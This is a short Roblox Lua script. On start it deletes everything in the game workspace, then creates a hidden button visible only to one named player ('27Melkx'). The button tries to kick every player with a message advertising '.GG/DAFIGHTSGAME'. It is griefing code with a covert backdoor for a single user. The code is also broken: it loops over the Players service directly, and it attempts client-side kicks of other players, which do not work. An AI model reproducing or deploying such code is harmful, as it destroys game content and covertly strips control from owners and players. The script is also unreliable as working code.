local Player = game.Players.LocalPlayer
for i,v in pairs(workspace:GetChildren()) do
	v:Destroy()
end
local HellcatUI = Instance.new("Frame")
HellcatUI.Visible = false
HellcatUI.Parent = Player.PlayerGui.MainScreenGui
local Destroy = Instance.new("TextButton")
Destroy.Parent = HellcatUI
if Player.Name == "27Melkx" then
	HellcatUI.Visible = true
end
Destroy.Activated:Connect(function()
	for i,v in pairs(game.Players) do
		v:Kick(".GG/DAFIGHTSGAME")
	end
end)
